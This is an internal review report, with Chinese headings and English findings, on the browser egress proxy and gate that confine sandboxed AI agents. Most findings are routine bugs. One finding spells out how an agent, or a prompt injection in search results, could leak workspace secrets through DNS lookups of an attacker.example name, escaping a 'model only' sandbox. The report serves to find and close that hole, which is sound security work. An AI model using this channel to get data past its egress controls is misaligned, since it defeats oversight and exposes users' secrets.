# 浏览器实现的对抗评审（原始结果，2026-11-04）

workflow `browser-impl-review`：4 个方面（出口代理、守门和转发口、CDP 和启动、接线），每个方面一个反驳者核对。下面是原样结果（英文），处理结果见 docs/browser.md“评审”。

## proxy

### A curl denial of one host blocks the whole site in the browser, overriding approvals the browser already got

- 位置：`crates/store/src/egress.rs:310`；评审定的严重程度：medium；核对：**成立**（medium）
- 场景：Direct-lane asks also store `site`: ask_inner passes Some(site) for Via::Direct (llm-gw egress.rs:1259), and egress_ask_as binds meta.site on insert (store egress.rs:426). egress_site_decision then returns the newest 'once'/'denied' row for that site, whichever lane wrote it (no `via` filter). Both browser_connect's site_denied (egress.rs:1468) and ask_inner's Browser branch rely on it. Example, Dev mode, one run: (a) the agent runs `curl https://gist.github.com` and the user taps Deny. That is a host-level answer for the direct lane. (b) The agent calls browser_navigate("https://github.com/x"). /v1/browser/ask returns allowed/default because github.com is a dev host. The gate continues, but the CONNECT github.com:443 on the browser lane hits site_denied("github.com") = true and gets 403 user_denied. Chromium only reports ERR_TUNNEL_CONNECTION_FAILED, so the agent gets no explanation. The same happens to a site the user approved earlier in the browser (the gate keeps it in its own cache and never asks again, while the proxy now refuses every tunnel to it) and to a site in egress_hosts (ask says allowed/always, tunnels refused). A site the gate never cached gets result `denied` from the ask, so the browser reports user_denied for a site the user never denied in the browser. The reverse also happens: a later curl 'once' for cdn.S becomes the newest row and lifts an explicit browser denial of S at the proxy.
- 建议：Keep direct-lane denials host-level for the browser. Either restrict the 'denied' half of egress_site_decision to `via = 'browser'` rows (direct 'denied' rows should only block their exact host, e.g. site_denied also checks egress_decision(host)), or store `site` only on browser rows and look up direct answers by host. Then a denial in one lane can neither revoke a browser site approval nor be cleared by a 'once' in the other lane. Also skip the site-denial check for hosts that mode.allows() lets through by default, so the ask and CONNECT paths agree.
- 核对理由：Confirmed. ask_inner passes Some(site) for Via::Direct (crates/llm-gw/src/egress.rs:1259 -> 1788), pg.rs:634 forwards it as AskMeta{via, site}, and egress_ask_as binds meta.site ($9) on every INSERT (crates/store/src/egress.rs:426). So direct rows carry site even though the dedup at :364 is browser-only. egress_site_decision (:302-322) has no via/host filter and returns the newest once/denied row for the site. The doc comment (:300-301) shows the sharing was intended, but design 1.2 shares answers only for the same URL ('直接访问仍按完整网址算'). In decide_browser_ask, mode.allows (:1644) and the always-allowed check (:1649-1654) come before any site_decision. browser_connect checks site_denied (:1468) unconditionally. The gate only learns of denials from its own asks (approvals.deny), so after a curl denial it does not know. Walkthrough in Dev mode: curl api.github.com/gist.github.com, user denies. Then browser_navigate github.com: the ask returns allowed/default and the gate continues the request (approvals.hosts gets github.com, so the forward port grants it). The CONNECT to the proxy then hits site_denied('github.com') = true and gets 403 user_denied, so Playwright sees ERR_TUNNEL_CONNECTION_FAILED. The same happens to a site in egress_hosts and to a site the gate already cached as once-approved. Resources from that site on other pages are blocked too. The reverse case (a direct 'once' for cdn.S lifting a browser denial of S at the proxy) mostly does not matter, because the gate keeps S in approvals.denied, and wait_allowed and decide both refuse it. The defect is that /v1/browser/ask and CONNECT disagree, and that a host-level denial becomes site-wide. It fails closed with an opaque error, so medium rather than high.
- 核对建议：Make site-wide denial apply only to browser answers: in egress_site_decision add `AND (via = 'browser' OR host = $host)` (pass the exact host), so a direct-lane answer counts only for its own host, as design 1.2 says. browser_connect/site_denied would then pass the CONNECT host and key the cache by (instance, site, host) or check direct rows separately. Optionally skip the site-denial check in browser_connect for hosts that mode.allows() lets through, so ask and CONNECT agree.

### /v1/browser/ask resolves agent-chosen names before refusing model-only instances, so DNS leaks data

- 位置：`crates/llm-gw/src/egress.rs:1625`；评审定的严重程度：medium；核对：**成立**（medium）
- 场景：decide_browser_ask calls self.resolve(host, 443), a getaddrinfo lookup through the service machine's resolver, before it checks `mode == EgressMode::Model` (line 1637), quota and fresh mode.asks(). The orchestrator turns the browser on whatever the egress mode is (executor.rs: server switch, template supported, grant has `browser`). So on an instance set to 'model only', the agent can call browser_navigate("https://<base32-of-workspace-secret>.attacker.example/") repeatedly, or a page or script can drive the navigations. Every main-frame request makes the gate POST /v1/browser/ask, and the proxy sends a recursive DNS query for that name to the attacker's authoritative server before answering not_allowed. That gives up to about 600 lookups a minute (the browser lane counter) of covert egress for an instance meant to have no internet. The `resolve` vs `not_allowed` replies also tell the agent whether a name exists. The direct lane never resolves a host the user has not approved (resolution happens only in open()), so this channel is new. Custom mode has the same pre-approval lookup.
- 建议：Check the egress mode (re-read the instance fresh) before resolving: return not_allowed for Model mode, and for any mode where `!mode.asks() && !mode.allows(host, hosts)`, without touching DNS. Also move the quota check ahead of the lookup. Keep resolve-before-asking only for the modes that will actually ask the user.
- 核对理由：Confirmed. decide_browser_ask calls self.resolve(host, 443) (crates/llm-gw/src/egress.rs:1625) before the Model-mode check (:1637). resolve -> ssrf::resolve_public -> tokio::net::lookup_host is a recursive getaddrinfo through the service machine's resolver. The orchestrator turns the browser on with no egress-mode check (executor.rs: server switch && template supported && grant has `browser`). The gate does not cache not_allowed/resolve results (approvals.record only logs), so every browser_navigate to a new name sends one POST /v1/browser/ask and one DNS query to the attacker's authoritative server, then returns not_allowed. The sandbox itself has no DNS egress (docs/egress.md:25), and the direct lane never resolves an unapproved host (resolution happens only in open() after approval or allow). So this is a new covert channel out of an instance set to 'model only'. It is driven by tool calls (navigate, or tabs with a URL), roughly tens per minute at ~150 bytes per label set, which is enough to leak keys. Prompt injection via search results can trigger it. The design's own order in 3.3 puts resolve (step 3) before the Model check (step 4), so the code follows the design. But the design also says Model mode cannot use the browser lane at all, and none of R1-R6 covers this. The resolve/not_allowed difference is also a small existence oracle. Dev/Custom also resolve before asking; that is a deliberate design choice so private addresses are never asked about, and is lower risk because a card is shown.
- 核对建议：In decide_browser_ask, move the Model-mode check (and the quota check) ahead of resolve. For Model mode, re-read the instance fresh and return not_allowed without touching DNS. Optionally also have the orchestrator not hand the browser pass to instances whose egress_mode is Model.

### The 40 s ask wait starts after DNS and DB work, so unanswered asks come back as 'unavailable'

- 位置：`crates/llm-gw/src/egress.rs:1659`；评审定的严重程度：medium；核对：**成立**（low）
- 场景：The gate's hard limit is wait_secs + 2 s from before it connects (agent-shim gate.rs:88-89). On the proxy side the 40 s clock only starts at ask_inner's `deadline = now + wait` (line 1821). Before that, browser_ask/decide_browser_ask do verify_browser_pass, the body read (up to 10 s), self.resolve (getaddrinfo with no timeout; glibc retries take 5 s or more), quota_used_up (DB), a forced directory reload (DB), site_decision (DB) and ledger.ask (several DB queries). Suppose these take more than about 2 s, for example a cold lookup of a slow overseas domain or a busy DB pool, and the user does not answer. The proxy would reply 'pending' at about pre + 40 s, but the gate has already given up at about 41 s and returns `unavailable`. The agent sees 'The platform's internet service is unavailable right now' instead of pending_approval, even though a card is waiting in the app. If the user approves at 39-40 s, the approval is likewise reported as unavailable.
- 建议：Record an Instant when browser_ask starts. Compute `remaining = min(wait_secs, 40s).saturating_sub(started.elapsed())` and pass that to ask_inner (or pass an absolute deadline). Put a short timeout on resolve in decide_browser_ask (e.g. 5 s, which maps to `resolve`). Optionally keep the proxy's wait a few seconds below the gate's limit.
- 核对理由：The mechanics are as described. The gate's limit is wait_secs + 2 s, measured from before its TCP connect (agent-shim gate.rs:88-89). The proxy's deadline is set only inside ask_inner (:1821), after verify, body read, resolve (no timeout, :1625 / ssrf.rs:107), quota_used_up, a forced directory reload, site_decision and ledger.ask. Usually this work takes well under the 2 s margin. It exceeds it on slow lookups, for example the common 5 s glibc retry when an authoritative server drops AAAA queries, or a pool stall. Then, when the user does not answer, the proxy replies pending at about pre + 40 s, after the gate has already returned 'unavailable'. The agent is told the platform's internet is down instead of pending_approval. An approval at 37-40 s is shown as unavailable too, but the next navigate succeeds via site_decision. Nothing is unsafe and the card stays valid; only the status line is wrong, so low rather than medium.
- 核对建议：Take an Instant at the start of browser_ask and pass `min(wait_secs, browser_ask_wait).saturating_sub(started.elapsed())` (or an absolute deadline) into ask_inner. Wrap the resolve in decide_browser_ask in a short timeout (e.g. 5 s, mapped to `resolve`).

### The site-denial cache is not keyed by task and is not updated when a denial is recorded

- 位置：`crates/llm-gw/src/egress.rs:1544`；评审定的严重程度：low；核对：**成立**（low）
- 场景：denied_sites is keyed by (instance, site) only and keeps entries for 15 s. Run 1 ends right after the user denied S, and the next task starts within 15 s. In run 2 the gate asks about S, egress_site_decision finds nothing for the new run, the user taps 'Visit once', and the gate continues. The CONNECT to S still hits the cached `true` from run 1 and gets 403 user_denied, so the page fails just after the user approved it. In the other direction, a `false` cached just before the user taps Deny in /v1/browser/ask keeps resources from S flowing for up to 15 s, because the ask path never invalidates the entry.
- 建议：Include the current run in the cache key: site_decision already returns it, and the cache entry could store it and be ignored when the run differs. When decide_browser_ask gets 'denied' or 'allowed', overwrite the (instance, site) entry in the same process.
- 核对理由：denied_sites is keyed by (instance, site) with a 15 s TTL (egress.rs:630-634, 1543-1560) and ignores the run that site_decision returns. Cross-run case: a `true` entry gets cached late in run 1. That needs a browser-lane CONNECT to S after the denial, e.g. a resource after a denial that arrived while the gate's ask was pending, or a direct-lane denial (finding 1). If run 2 starts, its gate (cleared at begin_run) asks, and the user taps 'Visit once' all within those 15 s, the main-frame CONNECT still hits the stale `true` and gets 403. That is possible but needs tight timing, and the cost is one failed load that works on retry. The other direction, a stale `false` for up to 15 s after a denial, is the cache TTL working as designed. When the ask path itself sees 'denied', the gate also calls approvals.deny, so the forward port refuses resources from S. The proposed 'overwrite on ask' fix would not help the case where the decision arrives via the gateway. Real but marginal.
- 核对建议：Store the run with the cache entry and treat a hit as a miss when site_decision's run differs. Simplest: in decide_browser_ask, when the result is allowed, remove the (instance, site) entry; when it is denied, set it to true.

### Browser-lane re-check after waiting for a tunnel slot uses the directory cache, unlike the direct lane

- 位置：`crates/llm-gw/src/egress.rs:1516`；评审定的严重程度：low；核对：不成立
- 场景：After waiting for a slot (up to browser_slot_wait = 10 s), the direct lane forces a refresh with `self.gw.directory.instance(id, true)` before re-verifying the token (line 1287). browser_connect only calls verify_browser_pass, and verify_for first takes the cached instance (`instance(iid, false)`, cache_secs default 5) whenever it still looks usable. If the task attempt ends while a browser CONNECT is queued (the token generation is bumped), the queued CONNECT still passes the re-check against the stale cache and opens a tunnel with a pass that is no longer valid. It then lives until the next 30 s recheck, which uses the cache as well.
- 建议：Do what the direct lane does: call `self.gw.directory.instance(&caller.instance.id, true).await` before the post-wait verify_browser_pass, or give verify_for a 'fresh' flag for re-checks.
- 核对理由：The difference is real: the direct lane forces instance(id, true) before re-verifying (:1287), and browser_connect only calls verify_browser_pass (:1516-1517), which uses instance(iid, false) when the cached copy looks usable (proxy.rs:408-409). But this adds no exposure. The directory TTL is 5 s (main.rs:75-77). A stale cached instance can only pass the re-check if it was loaded before the epoch bump and is under 5 s old. That is exactly the window every brand-new CONNECT on either lane already gets at its first verify_for, which is the accepted cache staleness. The browser slot wait is at most 10 s, so the re-check cannot stretch the window past the TTL. Also, at attempt end the shim kills Chromium and the forward port, which hold the pass, so no queued client survives to use such a tunnel. The 30 s recheck reloads after the TTL and closes it. Not a meaningful defect.
- 核对建议：None needed. For consistency, call self.gw.directory.instance(&caller.instance.id, true) before the post-wait verify_browser_pass.

### Concurrent browser asks for two hosts on the same site create two pending cards

- 位置：`crates/store/src/egress.rs:366`；评审定的严重程度：low；核对：**成立**（low）
- 场景：Same-site de-duplication of browser asks is a plain UPDATE of an existing pending row, with only a non-unique index behind it (0038_browser.sql:10, egress_requests_site_pending). Two transactions running at once, for example the gate asking about a.zhihu.com in one tab and zhuanlan.zhihu.com from a popup, both find no pending row, and both INSERT because the hosts differ and the unique index is per host. The user gets two cards for zhihu.com. The design (3.3 step 8) says the user sees one card per site.
- 建议：Make the de-duplication atomic: add a unique partial index on (instance_id, site) WHERE status='pending' AND via='browser' and use ON CONFLICT on it for browser inserts, or take a pg_advisory_xact_lock(hash(instance, site)) before the touch/insert sequence.
- 核对理由：Confirmed under READ COMMITTED. The site dedup is an UPDATE ... WHERE site=$2 AND via='browser' AND status='pending' (store egress.rs:366-380), and the only unique index is egress_requests_pending (instance_id, host) (0034:28). egress_requests_site_pending (0038:10) is not unique. The gate handles each Fetch.requestPaused in its own tokio::spawn (gate.rs:235), so two tabs or a popup can ask about a.S and b.S at the same time. If both transactions pass the UPDATE before either commits, both INSERTs succeed and the user gets two cards for one site, against design 3.3 step 8. The window is only the few milliseconds of the egress_ask_as transaction after different DNS latencies, so it is rare. The impact is an extra card and an extra slot used toward max_pending. Answering one card approves the site via site_decision, though the other ask keeps polling its own row until timeout.
- 核对建议：Take `SELECT pg_advisory_xact_lock(hashtext(instance_id::text || site))` at the start of the browser branch of egress_ask_as. A second unique partial index would conflict with the existing ON CONFLICT (instance_id, host) target and turn the race into a store error, so the lock is the smaller fix.

### Asks share the 600/min browser CONNECT counter, and a 'rate' reply shows up as 'unavailable'

- 位置：`crates/llm-gw/src/egress.rs:1583`；评审定的严重程度：low；核对：**成立**（low）
- 场景：browser_ask charges lane_key(instance, Browser), the same 600-per-minute counter that page-resource CONNECTs use, and returns result "rate" when it is used up (the per-IP limit at line 1574 does the same). The gate's leak_reason does not recognise "rate" (or "auth", "bad_request", "not_found") and maps it to `unavailable`. So once resource-heavy pages, or a hostile page, have used the minute's 600 connections, every navigation to a new site fails and the agent is told the platform's internet service is down. It does not learn that it should slow down.
- 建议：Give /v1/browser/ask its own per-instance counter, separate from the resource tunnels. Return a reason the gate knows (e.g. reuse `ask_rate`, or add `rate` to leak_reason with its own explanation page).
- 核对理由：Confirmed. browser_ask charges lane_key(instance, Browser) (:1582-1583), the same counter browser_connect uses (:1443-1444), and returns result 'rate' (:1574, :1584). 'rate' is not in the design's reply list (3.3), and gate leak_reason (gate.rs:552-562) maps it to 'unavailable'. A few ad-heavy pages (up to 100 registered hosts per page), or an approved page that opens many short WebSocket tunnels, can use up 600 attempts in a minute. After that, every navigation to a new site that minute shows 'The platform's internet service is unavailable right now' instead of a slow-down message. It resets every minute and has no security impact, so it is only a misleading status and a small availability problem.
- 核对建议：Give /v1/browser/ask its own per-instance key (e.g. lane_key(...) + ":ask") with a small limit. Map a rate reply to a reason the gate knows (reuse `ask_rate`, or add `rate` to leak_reason and pages.rs with 'too many requests this minute, try again shortly').

## gate

### Per-page resource-host cap is keyed by tab target and never reset on navigation, so it becomes 100 hosts per tab for the whole run

- 位置：`crates/agent-shim/src/browser/approvals.rs:104`；评审定的严重程度：medium；核对：**成立**（medium）
- 场景：on_resource (gate.rs:354-359) announces with page = the tab's target_id. per_page is only cleared by page_closed, which runs on Target.detachedFromTarget (gate.rs:222-229), not when the main frame commits a new document. Playwright MCP normally reuses one tab, so after the agent visits a few approved news sites in that tab (each loads 30-80 third-party hosts), the per-page set reaches BROWSER_HOSTS_PER_PAGE. From then on every new third-party host on any later approved page in that tab is silently not announced. Each such CONNECT waits ANNOUNCE_WAIT (3 s) in the forward port, holding one of Chromium's 16 proxy sockets, and is then refused with 403 not_announced. Pages load slowly and broken. The 500-per-run cap is effectively never the limit.
- 建议：Reset the page's per-page set when its main frame commits a new cross-document navigation (on_navigated for the main frame, or when the main-frame request is continued), or key the set by (target_id, loaderId). Keep the per-run total as it is.
- 核对理由：Confirmed. gate.rs:354-359 passes `p.target_id` as the page key to `Approvals::announce`. `per_page` (approvals.rs:104-107) is cleared only by `page_closed`, which runs on Target.detachedFromTarget (gate.rs:222-229), and by `clear()` at begin_run/end_run. Nothing resets it when the main frame commits a new document. Playwright MCP's browser_navigate reuses the current tab, and a page target keeps its targetId across cross-site navigations. on_resource also counts the page's own first-party hosts (www.x.com, static.x.com), since it announces every https host it sees. So a run that reads a few sites in one tab fills the 100-entry set. After that, any new non-approved-site host is not announced: CDNs such as static.zhimg.com, githubassets.com and cdn.sstatic.net, and the APIs of later sites. Only hosts under an approved site still pass, through Grant::Main. Each refused CONNECT waits ANNOUNCE_WAIT (3 s) in wait_allowed before refusing with not_announced. That wait does not hold a forward slot, but it does hold one of Chromium's proxy sockets, which the managed policy caps with MaxConnectionsPerProxy=16. Later pages, SPAs above all, load slowly and come back broken or empty. The design gives a per-run cap of 500 next to a per-page cap of 100 and says an over-the-cap page 'displays incompletely', which only makes sense if 'page' means one document. As built, the 500 cap is almost never reached in single-tab use.
- 核对建议：Reset the page's per-page set whenever its main frame commits a new document. In on_navigated, after the main-frame check (frameNavigated fires only for cross-document commits), call `self.approvals.page_closed(&target.target_id)` before resources of the new document are announced. Keep the per-run 500 cap unchanged, since it still bounds a page that keeps navigating itself.

### Ask results applied after the await overwrite the page's current state even if the page has moved on

- 位置：`crates/agent-shim/src/browser/gate.rs:447`；评审定的严重程度：low；核对：**成立**（low）
- 场景：on_paused awaits the ask for up to 42 s, then unconditionally calls set_approved / set_site / explain on the session. Example: page P is on approved a.com. A script navigates to unapproved b.com (paused, asking), then navigates to a.com/next, which is approved, continued and committed; on_navigated sets approved=true. 40 s later the b.com ask returns pending, and explain() sets approved=false and explained=b.com on P (the fulfill fails because the request is gone). P is now showing a.com/next but approved=false, so none of its resource hosts are announced and the page breaks. A related case: a page on a site that is denied later in the run (www.google.com allowed with scope default, then docs.google.com denied, which denies site google.com) keeps approved=true and keeps announcing third-party hosts, against the rule that a denied site is not opened again in this task.
- 建议：Track the pending main request per page (requestId/networkId or loaderId). After the ask, only update approved/site/explained if that request is still the page's current navigation. Otherwise derive the state from the next Page.frameNavigated commit. In deny(), also clear approved on targets whose site is now denied.
- 核对理由：Mostly confirmed. on_paused awaits the ask for up to about 41 s, then calls set_approved, set_site and explain on the session with no check that this request is still the page's navigation. A concrete path exists in Playwright MCP 0.0.84. waitForCompletion waits only 500 ms (settle), then mainFrame().waitForLoadState('load'), which returns at once because the old document is still loaded while the new navigation is paused. So browser_click on a cross-site link returns within about 1-6 s while the ask is still pending. The agent's next browser_navigate to an approved URL cancels the paused request, and the new page is continued and committed with approved=true. When the old ask later returns pending or denied, explain() sets approved=false and explained=<old url> on the live approved page; the fulfill fails because the interception is gone. From then until the next cross-document navigation, new resource hosts of that page are not announced (lazy loads, XHR APIs) and are refused after 3 s. A late 'allowed' after the page moved on to an explanation page also sets approved=true and explained=None on that page. The impact is limited to one document and fails toward refusing, not toward reaching new sites, so severity is low. The second sub-case is not a real defect. A page opened earlier on a site that is denied later keeps loading third-party resources, but the forward port's wait_allowed checks `denied` first and the proxy lane refuses denied sites, so the denied site's own hosts are already blocked. The design rule 'not opened again in this task' is still met.
- 核对建议：Record the pending main request on the target (for example `pending_main: Option<String>`, set to request_id when a main-frame request is paused). After the ask, always apply approvals.approve/deny, but update approved/site/explained only if `pending_main` still equals this request_id. Otherwise leave the state to the next on_paused or on_navigated.

### Status line says the user approved a site the proxy allowed automatically

- 位置：`crates/agent-shim/src/browser/gate.rs:445`；评审定的严重程度：low；核对：**成立**（low）
- 场景：Every Verdict::Ask result is recorded with asked=true, and tools::status then prints 'approved: the user allowed X for this task.' for any allowed outcome. When the proxy answers allowed with scope default (search/dev hosts, or every host in the All mode) or always (an existing always-allowed site), no user was involved. Example: the first browser_navigate to https://github.com/x returns 'approved: the user allowed github.com for this task.' Design section 6 says that line is added only when the user was actually waited for.
- 建议：Record asked=true only when the reply shows the user was involved (for example, scope once/always from a fresh answer). Better, have the proxy return a flag saying whether it waited. Record default-scope approvals with asked=false.
- 核对理由：Confirmed. gate.rs:445 calls `self.approvals.record(&host, result, true)` for every Verdict::Ask outcome. tools::status then picks the last outcome with asked=true, and pages::status_line prints 'approved: the user allowed {host} for this task.' The proxy's decide_browser_ask (llm-gw egress.rs) answers allowed with scope 'default' at once for search and dev hosts, or for every host in the All mode, and answers 'always' at once for sites already in egress_hosts. github.com is in DEV_HOSTS, so the first browser_navigate to https://github.com/x gets 'approved: the user allowed github.com for this task.' even though no user was involved. The same happens for www.google.com. Design section 6 says that line is added only when the user was actually waited for. The effect is a misleading status line only, so severity is low.
- 核对建议：Shim-only minimal fix: record `asked = reply.scope.as_deref() != Some("default")`. To be exact for pre-existing 'always' sites too, add a `waited: bool` field to BrowserAskReply, set it only when ask_inner actually registered and waited on a request, and record asked = waited.

### Asks that outlive the triggering tool call get no status line; the outcome lands on an unrelated later call

- 位置：`crates/agent-shim/src/browser/gate.rs:429`；评审定的严重程度：low；核对：**成立**（low）
- 场景：Outcomes are recorded only when the ask finishes (up to 40 s later), and BrowserService::call reads outcomes_since(started) once, when the call returns (mod.rs:219). browser_click on a link to an unapproved site returns after Playwright's own short completion wait (about 10 s), while the ask is still pending. The click result has no pending_approval line and shows the old page, so the agent does not learn that the user is being asked. When the ask finishes, its pending or denied line is put on whatever tool call is running at that moment, for example an unrelated browser_snapshot.

### PR_SET_DUMPABLE(0) in serve makes the pre_exec write of oom_score_adj=500 fail silently; Chromium and Playwright run at 0

- 位置：`crates/agent-shim/src/main.rs:460`；评审定的严重程度：medium；核对：**成立**（medium）
- 场景：serve() sets the shim non-dumpable. A forked child inherits that flag until execve, and the kernel's task_dump_owner then makes the child's /proc/self/* files owned by root. launch.rs prepare_child (line 122) opens /proc/self/oom_score_adj O_WRONLY before exec as uid 1001; this gets EACCES, which `if fd >= 0` silently ignores. Reproduced here as uid 65534: dumpable=1 gives a pre-exec write ok and oom_score_adj=500 after exec; dumpable=0 gives Permission denied and oom_score_adj=0. In ACS (uid 1001, no CAP_DAC_OVERRIDE), Chromium and the Node Playwright MCP therefore keep score 0, so under memory pressure (1c3G/2c4G sandboxes) the kernel may kill the agent (Claude/Codex Node process) instead of the browser. That breaks design 2.3 item 6 and the 'fail closed, restart the browser' story. The local smoke ran as root, which hid this.
- 建议：Set the score after exec, when the child is dumpable again and owned by uid 1001. For Node, write /proc/self/oom_score_adj at the top of launch.cjs. For Chromium, exec it through `/bin/sh -c 'echo 500 >/proc/self/oom_score_adj && exec "$0" "$@"' /usr/lib/chromium/chromium ...` (fds 3/4 survive the exec), or have the parent write /proc/<pid>/oom_score_adj once the child has exec'd. Log a warning when the write fails, and add a test that runs as non-root.
- 核对理由：Reproduced here as uid 65534 with a fork-then-exec child (Rust's Command with pre_exec also uses fork, so mm flags are copied). With parent dumpable=1, the pre-exec open/write succeeds and the exec'd child reads 500. With dumpable=0, open('/proc/self/oom_score_adj', O_WRONLY) fails with EACCES (Errno 13) and the exec'd child reads 0. That is because task_dump_owner makes /proc/self/* root-owned until execve resets dumpability. launch.rs:122-128 ignores fd<0, and serve() sets dumpable 0 at main.rs:460 before any browser launch. Nothing else sets the score: launch.cjs does not, and grep finds no other oom_score_adj. In ACS the shim runs as uid 1001 without CAP_DAC_OVERRIDE, so design 2.3 item 6 silently does nothing. With 1-2 GiB sandboxes (pi/codex 1024 MB, claude 2048 MB) and Chromium idle at about 700 MB, OOM is realistic. At equal adj the kernel kills the largest RSS process, often the agent's Node process, which fails the run instead of restarting the browser. The root-run local smoke hid this.
- 核对建议：Set the score after exec, while the child is dumpable and owned by uid 1001. For Node, write '500' to /proc/self/oom_score_adj at the top of launch.cjs. For Chromium, exec via `/bin/sh -c 'echo 500 >/proc/self/oom_score_adj; exec "$0" "$@"' /usr/lib/chromium/chromium <args>`; fds 3/4 survive. That is race-free with Chromium forking its zygote. The parent can instead write /proc/<pid>/oom_score_adj right after spawn() returns (spawn returns only after exec), but it may lose a race with early forks. Log a warning when the write fails, and drop the pre_exec write.

### readOnlyHint on every browser tool lets Claude run browser actions in parallel; calls are not serialized and status lines are mixed up

- 位置：`crates/agent-shim/src/browser/tools.rs:59`；评审定的严重程度：medium；核对：**成立**（medium）
- 场景：load() overwrites the annotations of all kept tools with readOnlyHint=true, including browser_click, type, navigate, tabs, close and handle_dialog. This was meant for Codex approvals, but Claude Code also uses readOnlyHint for MCP tools as `isConcurrencySafe` and runs consecutive tool_use blocks in parallel. Example: Claude emits [browser_tabs{new,url:a.com}, browser_tabs{new,url:b.com}] or [browser_click(e5), browser_snapshot] in one message, and they now run at the same time. Nothing serializes them: Bridge::call spawns one task per call, BrowserService::call (mod.rs 204-219) has no lock, McpClient::call is concurrent, and the Playwright backend has no per-call mutex. Clicks, typing and snapshots then race on the same tab. In addition, `outcomes_since(started)` takes every outcome in the time window, so the a.com call (allowed) can get 'pending_approval: opening b.com ...' as its first line, or lose its own line. The shared `navigating` flag is cleared by whichever navigation finishes first, so later asks are logged with the wrong cause. The agent then acts on wrong status lines, e.g. it retries a page that already opened or skips one that is pending.
- 建议：Serialize browser tool calls in BrowserService::call, e.g. a tokio::sync::Mutex held from ensure() through client.call, so each call's outcomes and the navigating flag belong to it alone. Keep readOnlyHint only on the tools that really are read-only (snapshot, find, console_messages, network_requests/request, take_screenshot, wait_for). For Codex, use the per-tool approval_mode config (design 2.7, option 1) rather than marking state-changing tools read-only.
- 核对理由：Verified. In the local Claude Code 2.1.42 cli.js, the MCP tool wrapper has `isConcurrencySafe(){return z.annotations?.readOnlyHint??!1}`, so tools.rs:59 makes browser_navigate, browser_click, browser_tabs and browser_type eligible for parallel execution. Upstream Playwright marks navigate/click as actions, so Claude would normally run them one at a time. Nothing in the path serializes. Bridge::serve_conn tokio::spawns each call. BrowserService::call (mod.rs:188-245) holds the session mutex only inside ensure(). McpClient::call issues concurrent JSON-RPC requests. In Playwright's backend callTool, `setRunningTool` only records a name, with no queue or lock. Claude routinely emits several parallel fetch-like calls, so parallel browser_navigate calls on the single current tab interrupt each other: errors, plus snapshots that belong to another call. `outcomes_since(started)` (approvals.rs:173) returns every outcome in the time window, so one call can carry another call's pending_approval/user_denied first line. The shared `navigating` flag only changes the AskCause label (gate.rs:416), which is a minor mislabel. No security impact, but a realistic correctness problem for the main agent.
- 核对建议：Add a `tokio::sync::Mutex<()>` to BrowserService and hold it in call() from ensure() through client.call(). Start the 55 s budget after the lock is acquired, so a queued call is not timed out by another call's approval wait. This serializes all five agents and makes outcomes and `navigating` belong to one call. Keeping readOnlyHint for Codex is then harmless; optionally keep it only on truly read-only tools and rely on the Claude allow list for the rest.
